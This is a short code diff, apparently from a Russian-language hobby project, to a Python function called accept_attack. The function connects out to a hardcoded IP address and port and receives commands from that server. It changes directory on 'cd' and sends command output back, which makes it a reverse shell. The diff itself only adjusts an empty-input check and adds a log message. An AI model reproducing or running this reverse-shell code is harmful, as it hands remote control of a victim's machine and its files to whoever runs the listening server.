@@ -67,7 +67,8 @@ def accept_attack(ip, port):
         print(data.decode(), ": incoming answer from server")
         if data.decode() == "quit":
             break
-        if len(data) > 0:
+        #у пустой строки длинна равна 1, поэтому 1 наша точка отсчета
+        if len(data) > 1:
             if data[:2].decode() == "cd":
                 try:
                     os.chdir(data[3:].decode())
@@ -90,6 +91,7 @@ def accept_attack(ip, port):
                 sock.send(output_bytes)
         else:
             sock.send(b"Unknown command")
+            print("Unknown command was sended")
     sock.close()
 
 accept_attack("109.237.25.179", 9090)
